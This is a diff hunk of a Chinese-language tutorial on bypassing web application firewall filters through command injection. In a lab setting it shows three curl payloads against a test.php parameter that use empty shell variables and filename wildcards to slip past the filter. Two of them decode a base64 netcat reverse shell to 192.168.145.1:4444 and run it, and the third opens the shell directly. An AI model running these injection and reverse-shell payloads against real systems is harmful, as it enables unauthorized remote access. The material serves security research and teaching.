@@ -46,9 +46,9 @@ accent_color:          '#4fb1ba'
     ![Full-width image](/assets/img/docs/MlnUV1/17.png)
 13. 根据fuzz的结果得出部分可用字符，通过这些字符可以组合payload，此处列举三个：(其中20bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjE0NS4xIDQ0NDQgICAK为nc -e /bin/sh 192.168.145.1 4444的base64编码)，可自行发散思路测试多种命令，组合出多种payload
 >
-curl -s http://192.168.145.5/test.php?file=%26/bin$u/echo$u%20bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjE0NS4xIDQ0NDQgICAK|/usr$u/bin$u/base64$u%20-d|/bin$u/sh$u"
-curl -s 'http://192.168.145.5/test.php?file=%26/bin/ech?%20bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjE0NS4xIDQ0NDQgICAK|/u?r/b?n/b?se64%20-d|/b?n/sh'
-curl -s 'http://192.168.145.5/test.php?file=%26/b?n/nc$u%20-e%20/b?n/sh$u%20192.168.145.1%204444'
++ curl -s http://192.168.145.5/test.php?file=%26/bin$u/echo$u%20bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjE0NS4xIDQ0NDQgICAK|/usr$u/bin$u/base64$u%20-d|/bin$u/sh$u"
++ curl -s 'http://192.168.145.5/test.php?file=%26/bin/ech?%20bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjE0NS4xIDQ0NDQgICAK|/u?r/b?n/b?se64%20-d|/b?n/sh'
++ curl -s 'http://192.168.145.5/test.php?file=%26/b?n/nc$u%20-e%20/b?n/sh$u%20192.168.145.1%204444'
 >
   此处主要利用到了两个知识点：1是linux下所有皆文件，因此各种可执行程序都是在可找到的文件，而在找文件的过程中是可以利用通配符的，可以利用该特性对过滤进行绕过，另一点就是使用空变量$u，linux中是可以存在空变量的，直接被系统视为空字符串，空变量不会对输出造成影响，可以借此来绕过基于正则表达式的过滤器和模式匹配此处参见['secist'](https://www.freebuf.com/author/secist)大佬['绕过CloudFlare WAF和ModSecurity OWASP CRS3核心规则集的技巧介绍'](https://www.freebuf.com/articles/web/184414.html)的文章
 
